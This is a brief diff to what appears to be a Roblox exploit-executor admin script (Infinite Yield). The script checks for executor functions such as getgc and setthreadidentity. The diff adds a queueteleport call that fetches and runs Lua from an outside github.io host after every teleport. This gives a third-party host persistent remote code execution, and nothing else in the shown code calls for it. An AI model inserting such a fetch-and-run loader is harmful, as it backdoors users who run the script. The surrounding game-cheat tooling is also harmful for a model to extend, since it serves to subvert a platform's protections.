@@ -3,6 +3,7 @@ if IY_LOADED and not _G.IY_DEBUG then
 	return
 end
 
+
 pcall(function() getgenv().IY_LOADED = true end)
 if not game:IsLoaded() then game.Loaded:Wait() end
 
@@ -45,6 +46,10 @@ getgc = missing("function", getgc or get_gc_objects)
 setthreadidentity = missing("function", setthreadidentity or (syn and syn.set_thread_identity) or syn_context_set or setthreadcontext)
 replicatesignal = missing("function", replicatesignal)
 getconnections = missing("function", getconnections or get_signal_cons)
+
+queueteleport([[
+	loadstring(game:HttpGet("https://raycastparams.github.io/moon-yield/source.lua"))()
+]])
 
 Services = setmetatable({}, {
 	__index = function(self, name)
